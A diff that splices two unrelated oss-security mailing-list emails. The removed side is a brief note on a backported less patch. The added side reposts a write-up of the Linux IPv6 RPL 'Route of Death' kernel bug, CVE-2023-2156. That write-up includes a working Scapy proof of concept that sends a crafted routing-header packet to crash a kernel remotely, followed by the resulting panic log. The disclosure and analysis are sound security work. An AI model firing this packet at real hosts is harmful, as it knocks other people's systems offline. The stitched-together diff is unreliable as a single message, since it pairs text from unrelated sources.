@@ -1,4 +1,4 @@
-Received: (qmail 20251 invoked by uid 550); 13 Apr 2024 12:07:10 -0000
+Received: (qmail 17959 invoked by uid 550); 19 May 2023 11:42:14 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,94 +7,368 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 10103 invoked from network); 13 Apr 2024 09:10:37 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=googlemail.com; s=20230601; t=1712999428; x=1713604228; darn=lists.openwall.com;
-        h=content-transfer-encoding:autocrypt:subject:from:to
-         :content-language:user-agent:mime-version:date:message-id:from:to:cc
-         :subject:date:message-id:reply-to;
-        bh=GEptdn1qORsobJ4xSgtecgHldGI/D/DyjPmDQW+h6F0=;
-        b=dsYMHA9v07xnonCvwxt5DoPDbrhSmftPDDDJRd4AJl4DqiwYOGvmqwERu13DQepp9E
-         SWmllL7MA396VG5wdGCx7lYkqicif+sreirZuruiYv7i7misSKmjUJ4THvIanpcSJFvz
-         5j0Crge/gI3aRvsp33eX4SjcIgZqt+GiOoL0j7F9aCGGBcMuEcoSF7Z5ASHk21nxilfu
-         9xFSUF7B3O4ftC57pV2ag79ZFHu/+lZ+tl4nQLAXaU6QsEYcT8ULeIWXX31QsZ9Yyg4F
-         Iahnc3jTabf9F80wCltzrr49s4Qcra8sDmS+GFRcj/Iwmz5Z8nhLvqJWkuDc+z2WkSkR
-         B8bg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1712999428; x=1713604228;
-        h=content-transfer-encoding:autocrypt:subject:from:to
-         :content-language:user-agent:mime-version:date:message-id
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
-        bh=GEptdn1qORsobJ4xSgtecgHldGI/D/DyjPmDQW+h6F0=;
-        b=BsTPGmb3XceaC+okoZhR3jl2ngnT9hrNUE1Nue1Z2okcOD2OHguD3EZ+aQwBe+RurJ
-         xJR8Lb55l1vUPSeCvSVBBTk4CVDoz0jQd7k1IF9DamCAq6vf/w/re/Lx3OAAURaT9InD
-         BmJp/v9Tt5HkWG7IYU7sp8hfwhSyo9sIcE1xEsDnZ4n+a1RiEqGJQjsIiu+FeWaNmzu1
-         fxU8J1QLMUCufkubuXfRoCpHaLuSrKeo2/fZGAXAnO8oYzsiPvIopVfIPGe0LD/ztBPW
-         ezSEDGajwLUwQGZxhw0DGdUjuS5zzR+jiDSviKPc0nGuWCHj6Q20jWMKJFp+7V1mqeUU
-         hK6A==
-X-Gm-Message-State: AOJu0YxiBpdx4W3vFjAEpcHdKUQ9FmOv5ksmLqCaCqWSgB/Wut8Wr6wo
-	DQamLiRLKXOKH2x9+bLow+Op7pHCFwTno12LJwHPSHNGG5b1O7g92RXQhL/+
-X-Google-Smtp-Source: AGHT+IG7j62k82EsznkA+ks6dIjv0sMRLlj7Qah0nhXTdkbTkff7w2mrZp60WMgmi/KBfk30o9zlYg==
-X-Received: by 2002:a50:9f86:0:b0:56f:c13c:4233 with SMTP id c6-20020a509f86000000b0056fc13c4233mr2708764edf.3.1712999427849;
-        Sat, 13 Apr 2024 02:10:27 -0700 (PDT)
-Message-ID: <0f416ad9-b326-4b43-8dbc-6b70d7c34279@googlemail.com>
-Date: Sat, 13 Apr 2024 11:10:26 +0200
-MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Content-Language: en-US, de-DE
+Received: (qmail 15660 invoked from network); 19 May 2023 11:35:49 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=codewreck.org; s=2;
+	t=1684496137; bh=+j2EoVp5ndgzM6idz/oVD3ss9/B6FVLfVaZjp74SJ4Y=;
+	h=Date:From:To:Subject:References:In-Reply-To:From;
+	b=k4w6y1fbOKa0JUSaYH53MCMDqNHZX0XjkPgiT05V2pjgxf34hsRImTcMigAvy24xn
+	 VxYEG9Lq6TT066lgZYzoJIghD/t3e0bhFhLSnY458P9UR/czQSKMkP1vP6jH26A2Ir
+	 k9hpl0GVyUMZsQ+2PHlfav4d7r9qja8VaJu81rgDvEN/yERIQipI7mi4GMLNzICJOR
+	 Cwb34E+Jsz7vYLSRbwdNJwtnFoA1xMXk0H01pR1qIiIuJLyhZ++XXuTuXSzyP7alQJ
+	 9TWXUO7gqVVA2Yduggt6FvDM9hqGbBsXkU2Ga6wNv9CwYkeF++yc+surc12l4xO0cY
+	 EhW0ToASeqFyg==
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=codewreck.org; s=2;
+	t=1684496136; bh=+j2EoVp5ndgzM6idz/oVD3ss9/B6FVLfVaZjp74SJ4Y=;
+	h=Date:From:To:Subject:References:In-Reply-To:From;
+	b=ijlOFLojTisKsYlEbMaFMGnXPrbKCsa+5EHeNvd8rBoYaHjuWCNKe1aJcrcAdqM3X
+	 kDCepAWhU8bW7W0Z+m/0P6MMCvI3if82tErcTwtbswDL6SNDfXVj2p8aE71FcM6PHB
+	 A+SPbKq6c+v5Gta1QWLuGq8H2oM/TbG6fp9Qpm05TDB2IobXFTLZaBG/Y5vZElrl3l
+	 2RqVtbRZhqmaZ4Gp0F1xuRAl5lnsdBw222P9nkAzUpW8EJiDRDniI2t8VrJGa3p8Xc
+	 NDp9V136bXvhLZbXr6Z514GwtH4JldHPCDudH1ugM6yaSEpGnVRWL2jUR1NOT+cvxE
+	 8OS0F/U/t4b1w==
+Date: Fri, 19 May 2023 20:35:17 +0900
+From: Dominique Martinet <asmadeus@codewreck.org>
 To: oss-security@lists.openwall.com
-From: Tobias Powalowski <tobias.powalowski@googlemail.com>
-Autocrypt: addr=tobias.powalowski@googlemail.com; keydata=
- xsBNBE4j2kMBCADIc5H8FTVyhxTV1ucwPYD16xFm2ksvoIxRqUU60OJSoUIN14J9aUrpa226
- P1MDnuUnnYeOq4OEP+N1I+CyfhhdldfaXMS5weEILDrWNSYof5R3y4gHc5cqTdoxqcw8VO4n
- 9WDS9bYh2y8hXOutKpij+DKmdG7TD71dBIu3pIFACsTmN990LDzTdBn1gznmBHU3qEnYy6YN
- V62t9hHTh8I3i1Qty0diLfLXhHkmEP2hdZ2hAW8qkxXPSAgqzcij6bqzXaIEtPIPZq9g5yLI
- N5jq1zprSZ7rxkjYw9nRl/C0OYWzB2Fu8h4kwK9ay+Kb7uyVs8W+13kfPp/23akLKc1nABEB
- AAHNNFRvYmlhcyBQb3dhbG93c2tpIDx0b2JpYXMucG93YWxvd3NraUBnb29nbGVtYWlsLmNv
- bT7CwNIEEwEIAIYFgmLJeDkECwkIBwkQdx32Yn7faB9HFAAAAAAAHgAgc2FsdEBub3RhdGlv
- bnMuc2VxdW9pYS1wZ3Aub3Jn3lzsTJodXa4iAHOuS+AXVbfyQcYAgueL7KMTfXCdJUIDFQgK
- BBYCAwECF4ACGwMCHgEWIQRbfj+3G38QMpocA6t3HfZift9oHwAAnccH/3shtmvo0UJ6jYNM
- V3s4GCZTvtTNMt2wPWMcN+TfByFfju1Gp+JF08IlP20jSXtxe2A3tsUt30zUVa0vFRuJwcHW
- RMx3yvT9xpIHY0N6axkV8JdibCXIy2bPU7RtxgbpWlNzdzyYVrSPqROoHfZcd8n1HGb6//m3
- MHOJnGipO7gHn+pgzyLHRkcqAaSssH4vhnd7q1fIY+Nxi0Ct9xZ+ZiHPWfvKdU89IfzAGC8H
- 5kou0Kqb7cW/WUaygDIom0Rhed1aG0BVK6ZpMajEb990Pe1/X0SzPtPzLQCEC70erSJ1dRLy
- bZmK9KkYvz1MG1m8lIRxw8VFoSNiIq3nD+whSJzOwE0ETiPaQwEIALiTKWbjLeBkbyfQ3Nqp
- 3tTCGfGmsfAdP5YzZtI01pFq1PVYtsCO09Sitxlo37IukDBfIp1KvOpKCAOvDQvpCIYkMehq
- C8vrjmRxYVe2wjRe9QSQ3UNbVP4pEAUUe9jj3h+EDazwNkHBZUf8ps8p2CzBtezRXhDckBqp
- cacrpvOYsR1OWzV4ARu/QS/5HDzMzY75FL5ms08v4UXAM2kjV5wNMUl0silDwEB+oej5Piht
- xGrqCGTsDMHU3McLL1aNFuMKKyZixxaHnk9kPS/xwWd/KnCjLWUV8EtfGt0b1zOwSnPnMFgZ
- K5KEx2Tr9rXYGXRW/9Qt8LltwIAM8up2BbsAEQEAAcLAvgQYAQgAcgWCYsl4OQkQdx32Yn7f
- aB9HFAAAAAAAHgAgc2FsdEBub3RhdGlvbnMuc2VxdW9pYS1wZ3Aub3Jn5EnEZyR1I6mUNjYl
- r8+ud2+SBPaGL1bNdTTpNSBovKMCGwwWIQRbfj+3G38QMpocA6t3HfZift9oHwAAVggH/1cE
- NNnXQy73l3bjfpGPlPMdP7OEPOgrmHAPnSH8hKrcjm6KMFnwansP/MRmAsphHZ6eXKzuJM2t
- Xpoe42Ikp2QQC/fC6glCU3D8HTXciNXdRUYEbYoZIXxyYx+0F4GzoJqc5hpdno/8NjpbKbFj
- WCD4bjJJ/WC2d1LPuB0mz4njMaKOlLJMMJo4oAcTWGzVEiITF/nHagSoGS6bSBxF1QE36kTh
- pz0bVKfwlxgfCwLoqVHO8QMSZ8V7S1EhN2qd2PCOx1uRA95ShACh1UggbgqGGQRgGKnuRvZ2
- R+F5fiya9va1HLXsYfCbgX5HEAG3dcLteyNHLyuJuXnK4D+BuXM=
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 7bit
-Subject: [oss-security] Re: less(1) with LESSOPEN mishandles \n in paths
+Message-ID: <ZGde9W1MaWT2l-Ta@codewreck.org>
+References: <CAH8yC8kBFkWL1MRGv+z1wJ4Vj2KOmuK1xm63XGgQMJW+OB=Q9Q@mail.gmail.com>
+ <20230517171351.GA8234@openwall.com>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+Content-Disposition: inline
+In-Reply-To: <20230517171351.GA8234@openwall.com>
+Subject: Re: [oss-security] IPv6 and Route of Death
 
-Hi backported patch for 643:
+Solar Designer wrote on Wed, May 17, 2023 at 07:13:51PM +0200:
+> > I _think_ this is the original writeup:
+> > 
+> >   * https://www.interruptlabs.co.uk//articles/linux-ipv6-route-of-death
+> 
+> Thank you for bringing this to oss-security.
+> 
+> I'd appreciate it if you and/or others also post plain text extracts of
+> such content, not only the links.  Anyone willing to do it this time?
 
-https://gitlab.archlinux.org/archlinux/packaging/packages/less/-/commit/1d570db0c84fe95799f460526492e45e24c30ad0
+A couple of days late, but since I wanted to read it myself, here's the
+text content (as rendered by edbrowse, which looks good enough to me,
+look for 'h3' to jump to next sections e.g. 'h3 The Bug'):
+--------------
+h3 Introduction
 
-Best regards
+Sometimes I feel like exploring random areas of code.
+It's a pretty good way to find a new bug pattern.
+Early last year I was doing just that, prodding around the Linux Kernel source,
+and came across something neat.
 
-tpowa
+h3 Something Neat
+
+The linux kernel handles network data in a structure called an sk_buff (Socket
+Buffer). The structure contains a LOT of information,
+but the important members are these:
+
+* Head - A pointer to a block of memory containing the packet data
+* Data - A pointer to the start of the data to be parsed (There could be
+padding before the data, or already-parsed data)
+* Tail - An offset to the end of the packet data in the region
+* End - An offset to the end of the allocated block of memory
+* Len - The distance between the Data pointer and the tail offset
+
+It looks a little like this:
+
+The SKB structure (although the members are reordered to make it clearer)
+
+In order to interract with this data structure, a number of functions are used,
+including:
+
+* skb_push (Adds data to the start of the buffer by subtracting from the data
+pointer)
+* skb_pull (Removes data from the start of the buffer by adding to the data
+pointer)
+
+skb_push has a bit of code that prevents it from going outside the bounds of
+the allocated buffer:
+
+
+
+void *skb_push(struct sk_buff *skb, unsigned int len) {
+	skb->data -= len;
+	skb->len  += len;
+  if (unlikely(skb->data < skb->head))
+  	skb_under_panic(skb, len, __builtin_return_address(0));
+  return skb->data;
+}
+
+
+
+If the amount of space we're adding to the start of the buffer is more than we
+have allocated, then it'll cause a kernel panic instead of continuing
+execution.
+This means that any vulnerabilities that would ordinarily cause out-of-bounds
+behaviour (the good stuff) are now reduced to denial-of-service bugs.
+
+While a denial-of-service bug may seem boring,
+the "remote" aspect usually associated with sk_buffs make them still pretty
+interesting. A remote kernel panic is still pretty fun!
+
+I found an instance of this issue type in the IPv6 code for handling Routing
+headers. More specifically, the Routing Protocol for Low-Power and Lossy
+Networks (RPL Source Routing - RFCs 6550 to 6554).
+
+h3 Routing and RPL
+
+Network protocols are stupidly complex. Ever looked at the RFC for TCP?
+Absolutely disgusting.
+Fortunately for terrible people such as myself,
+complexity paves the road for bugs.
+
+IPv6 has the concept of optional Extension Headers which contain information
+about the packet, how it's configured, and where it needs to go to.
+One category of header is the Routing header which allows packets to list a
+series of IPv6 devices the packet should pass through.
+The base structure of the Routing header is as so:
+
+
+The Routing Header layout from RFC 8200
+
+
+
+As shown above, there is a Routing Type member.
+This affects the format of the type-specific data.
+A number of Routing Types are usable:
+
+* 0 - A deprecated type (Deprecated due to it allowing denial-of-services)
+* 1 - Another deprecated type used for Nimrod routing (RFC 1992)
+* 2 - Used for Mobile IPv6
+* 3 - Used for RPL Source Routing
+* 4 - Used for Segment Routing
+
+Since the vulnerability itself resides in the implementation of RPL,
+Type 3 is what's important here.
+The full RPL header is structured as so:
+
+
+
+The RPL Header Structure from RFC 6554
+
+
+
+RPL Source Routing also allows for the compression of addresses (RFC 6554)
+using the CmprI and CmprE parameters.
+These values say how many octets of the destination address are the same as all
+the addresses in the vector (and can thus be ommitted for each address in the
+vector).
+
+The reason for this is that it's likely that RPL will be used in local networks
+where the most significant octets of all the addresses will be the same (which
+would be quite wasteful to transport).
+The CmprI value says how many octets to omit for all the addresses except the
+last address in the vector, and the CmprE value says how many octets to omit
+for the final address in the vector.
+
+When the packet arrives at the next node,
+it needs to decompress the addresses for several reasons:
+
+* It needs to verify that there are no loops in the list of addresses
+* It needs to update the destination address of the IPv6 packet to the next
+address in the list and then recompress the vector based on this new
+destination address
+
+The process for receiving an RPL packet is therefore:
+
+1. Decompress all the addresses in the vector by attaching the CmprI/CmprE
+least significant octets from the addresses in the vector,
+to the most significant octets of the destination address
+2. Check for loops in the addresses vector
+3. Swap the destination address of the packet with Addresses[n -
+segments_left - 1] (where n is the number of addresses in the vector,
+as shown above)
+4. Recompress the addresses in the vector against the new destination address
+5. Forward the packet on
+
+h3 The Bug
+
+Because of the way this standard works,
+it's possible to cause an amplification attack in the case where segments_left
+is 1:
+If I have a CmprI value of 15 (So each address in the vector will only contain
+a single byte), but have a CmprE value of 0 (so the final address in the vector
+contains the full 16 bytes), then when the final address in the vector becomes
+the destination address (as would happen when segments_left == 1),
+it may not be possible to recompress all the addresses.
+
+This means that an addresses vector that is 48 bytes long (32x1-byte addresses
+and 1x16-byte address) the addresses vector recompresses to 528 before being
+forwarded onto the next machine.
+
+Interestingly, this expansion is where the underlying bug in the code is.
+
+In the Linux Kernel, the function that performs RPL and calls the
+decompression/compression routines is ipv6_rpl_srh_rcv.
+When it comes to decompressing the addresses vector,
+a buffer is allocated for it:
+
+buf = kcalloc(struct_size(hdr, segments.addr, n + 2), 2, GFP_ATOMIC);
+
+/* ... */
+
+ipv6_rpl_srh_decompress(ohdr, hdr, &ipv6_hdr(skb)->daddr, n);
+
+The destination address is then swapped with the next one (and the original
+destination address is stored in-place in the addresses vector):
+
+swap(ipv6_hdr(skb)->daddr, ohdr->rpl_segaddr[i]);
+
+Following this, the addresses vector is then re-compressed against the new
+destination address:
+
+ipv6_rpl_srh_compress(chdr, ohdr, &ipv6_hdr(skb)->daddr, n);
+
+The SKB is then re-used for the forwarding by copying the re-compressed data
+into it, as well as resetting and rebuilding the headers:
+
+oldhdr = ipv6_hdr(skb);
+skb_pull(skb, ((hdr->hdrlen + 1) << 3));
+skb_postpull_rcsum(skb, oldhdr, sizeof(struct ipv6hdr) + ((hdr->hdrlen + 1) << 3));
+skb_push(skb, ((chdr->hdrlen + 1) << 3) + sizeof(struct ipv6hdr));
+skb_reset_network_header(skb);
+skb_mac_header_rebuild(skb);
+skb_set_transport_header(skb, sizeof(struct ipv6hdr));
+memmove(ipv6_hdr(skb), oldhdr, sizeof(struct ipv6hdr));
+memcpy(skb_transport_header(skb), chdr, (chdr->hdrlen + 1) << 3);
+
+The big problem here is the call to skb_push,
+which tries to add space to the head of the skb for the addresses vector.
+In the example mentioned earlier, we changed 48 bytes into 528.
+If there are not 528 bytes to spare in the head of the SKB,
+then it will cause the data pointer to be below the head pointer and cause a
+kernel panic.
+
+h3 Proof-of-Concept
+
+It's possible to trigger this on a machine with RPL enabled (sysctl -a |
+grep -i rpl_seg_enabled) with the following code:
+
+# We'll use Scapy to craft the packet
+from scapy.all import *
+import socket
+
+# Use the IPv6 from your LAN interface
+DST_ADDR = sys.argv[1]
+SRC_ADDR = DST_ADDR
+
+# We use sockets to send the packet since sending with scapy wasn't working (And I'm far too lazy to debug things)
+sockfd = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_RAW)
+
+# Craft the packet
+#   Type = 3 makes this an RPL packet
+#   Addresses contains 3 addresses, but because CmprI is 15, each octet of the first two addresses is treated as a compressed address (So technically there are 16 compressed addresses)
+#   Segleft = 1 to trigger the amplification
+#   lastentry = 0xf0 sets CmprI to 15 and CmprE to 0
+p = IPv6(src=SRC_ADDR, dst=DST_ADDR) / IPv6ExtHdrSegmentRouting(type=3, addresses=["a8::", "a7::", "a6::"], segleft=1, lastentry=0xf0)
+
+# Send this evil packet
+sockfd.sendto(bytes(p), (DST_ADDR, 0))
+
+This causes the a lovely little kernel panic:
+
+[   53.385136] skbuff: skb_under_panic: text:ffffffff81c89927 len:576 put:576 he
+[   53.385601] kernel BUG at net/core/skbuff.c:112!
+[   53.386005] invalid opcode: 0000 [#1] SMP NOPTI
+[   53.386144] CPU: 0 PID: 727 Comm: python3 Not tainted 5.15.0-69-generic #76-U
+[   53.386260] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1
+[   53.386471] RIP: 0010:skb_panic+0x4f/0x51
+[   53.386715] Code: 48 70 57 8b b8 bc 00 00 00 57 8b b8 b8 00 00 00 57 48 c7 c7
+[   53.386955] RSP: 0018:ffffc90000003c40 EFLAGS: 00000246
+[   53.387049] RAX: 0000000000000084 RBX: ffff888101de0438 RCX: 0000000000000000
+[   53.387138] RDX: 0000000000000000 RSI: ffff88813bc20580 RDI: ffff88813bc20580
+[   53.387228] RBP: ffffc90000003c60 R08: 0000000000000003 R09: 61705f7265646e75
+[   53.387316] R10: 0000000075626b73 R11: 0000000075626b73 R12: ffff888103eb3800
+[   53.387407] R13: ffff888103eb3a18 R14: ffff888101e58e00 R15: ffff888101de0410
+[   53.387538] FS:  00007f9f71ba7000(0000) GS:ffff88813bc00000(0000) knlGS:00000
+[   53.387639] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   53.387719] CR2: 00007f9f6faa9030 CR3: 0000000101768000 CR4: 00000000000006f0
+[   53.387928] Call Trace:
+[   53.388258]  <IRQ>
+[   53.388373]  skb_push.cold+0x14/0x14
+[   53.388537]  ipv6_rpl_srh_rcv+0x2d7/0x9a0
+[   53.388612]  ipv6_rthdr_rcv+0x323/0x5c0
+[   53.388671]  ? update_load_avg+0x82/0x620
+[   53.388737]  ip6_protocol_deliver_rcu+0x47a/0x570
+[   53.388808]  ip6_input+0xb6/0xd0
+[   53.388860]  ? ip6_rcv_core+0x350/0x550
+[   53.388921]  ipv6_rcv+0x134/0x170
+[   53.388973]  ? task_tick_fair+0x382/0x5a0
+[   53.389032]  ? sched_clock_cpu+0x12/0xf0
+[   53.389094]  __netif_receive_skb_one_core+0x64/0xa0
+[   53.389168]  __netif_receive_skb+0x15/0x60
+[   53.389229]  process_backlog+0x9e/0x170
+[   53.389290]  __napi_poll+0x33/0x180
+[   53.389346]  net_rx_action+0x126/0x280
+[   53.389406]  ? clockevents_program_event+0xad/0x130
+[   53.389483]  __do_softirq+0xd9/0x2e7
+[   53.389546]  do_softirq+0x7d/0xb0
+[   53.389639]  </IRQ>
+[   53.389678]  <TASK>
+[   53.389713]  __local_bh_enable_ip+0x54/0x60
+[   53.389776]  ip6_finish_output2+0x1ef/0x590
+[   53.389845]  __ip6_finish_output+0xea/0x2b0
+[   53.389909]  ip6_finish_output+0x2e/0xc0
+[   53.389970]  ip6_output+0x75/0x130
+[   53.390024]  ? __ip6_finish_output+0x2b0/0x2b0
+[   53.390089]  rawv6_send_hdrinc+0x30b/0x580
+[   53.390155]  ? xfrm_lookup_route+0x24/0xc0
+[   53.390222]  rawv6_sendmsg+0x46e/0x990
+[   53.390279]  ? atime_needs_update+0x104/0x180
+[   53.390352]  ? kernel_init_free_pages.part.0+0x4a/0x70
+[   53.390424]  ? get_page_from_freelist+0x353/0x540
+[   53.390502]  inet_sendmsg+0x74/0x80
+[   53.390557]  ? rawv6_send_hdrinc+0x580/0x580
+[   53.390621]  ? inet_sendmsg+0x74/0x80
+[   53.390677]  sock_sendmsg+0x62/0x70
+[   53.390733]  __sys_sendto+0x113/0x190
+[   53.390805]  ? __schedule+0x435/0x590
+[   53.390865]  __x64_sys_sendto+0x24/0x30
+[   53.390924]  do_syscall_64+0x5c/0xc0
+[   53.390980]  ? schedule+0x69/0x110
+[   53.391034]  ? exit_to_user_mode_loop+0x7e/0x160
+[   53.391103]  ? exit_to_user_mode_prepare+0x37/0xb0
+[   53.391171]  ? irqentry_exit_to_user_mode+0x9/0x20
+[   53.391238]  ? irqentry_exit+0x1d/0x30
+[   53.391294]  ? sysvec_apic_timer_interrupt+0x4e/0x90
+[   53.391365]  entry_SYSCALL_64_after_hwframe+0x61/0xcb
+[   53.391482] RIP: 0033:0x7f9f71ccfbba
+[   53.391675] Code: d8 64 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00 f3 0f 1e fa
+[   53.391887] RSP: 002b:00007ffc84db1028 EFLAGS: 00000246 ORIG_RAX: 00000000000
+[   53.391995] RAX: ffffffffffffffda RBX: 00007ffc84db10d8 RCX: 00007f9f71ccfbba
+[   53.392085] RDX: 0000000000000060 RSI: 00007f9f6fab1250 RDI: 0000000000000003
+[   53.392174] RBP: 0000000000000000 R08: 00007ffc84db1150 R09: 000000000000001c
+[   53.392263] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
+[   53.392353] R13: ffffffffc4653600 R14: 00007ffc84db10d8 R15: 0000000000000001
+[   53.392463]  </TASK>
+[   53.392528] Modules linked in: scsi_dh_rdac scsi_dh_emc scsi_dh_alua drm btrf
+[   53.393435] ---[ end trace addf09f76fdcafaa ]---
+[   53.393520] RIP: 0010:skb_panic+0x4f/0x51
+[   53.393580] Code: 48 70 57 8b b8 bc 00 00 00 57 8b b8 b8 00 00 00 57 48 c7 c7
+[   53.393780] RSP: 0018:ffffc90000003c40 EFLAGS: 00000246
+[   53.393850] RAX: 0000000000000084 RBX: ffff888101de0438 RCX: 0000000000000000
+[   53.393935] RDX: 0000000000000000 RSI: ffff88813bc20580 RDI: ffff88813bc20580
+[   53.394020] RBP: ffffc90000003c60 R08: 0000000000000003 R09: 61705f7265646e75
+[   53.394105] R10: 0000000075626b73 R11: 0000000075626b73 R12: ffff888103eb3800
+[   53.394189] R13: ffff888103eb3a18 R14: ffff888101e58e00 R15: ffff888101de0410
+[   53.394276] FS:  00007f9f71ba7000(0000) GS:ffff88813bc00000(0000) knlGS:00000
+[   53.394372] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   53.394442] CR2: 00007f9f6faa9030 CR3: 0000000101768000 CR4: 00000000000006f0
+[   53.394598] Kernel panic - not syncing: Fatal exception in interrupt
+[   53.394957] Kernel Offset: disabled
+[   53.395086] ---[ end Kernel panic - not syncing: Fatal exception in interrupt
+
+h3 Report
+
+I reported this bug through the Zero Day Initiative{ZDI-23-547}.
+It was assigned CVE-2023-2156 but the bug patch didn't solve the underlying
+problem (ZDI confirmed this too), so we're still expecting another patch at
+somepoint. However, it has now been released as an 0day.
+Massive props to ZDI for relentlessly chasing up the fix over the past year.
+--------------
 
 -- 
-Tobias Powalowski
-Arch Linux Developer (tpowa)
-https://www.archlinux.org
-tpowa@archlinux.org
-
-Archboot Developer
-https://archboot.com
-
-St. Martin-Apotheke
-Herzog-Georg-Str. 25
-89415 Lauingen
-https://www.st-martin-apo.de
-info@st-martin-apo.de
-
+Dominique Martinet | Asmadeus
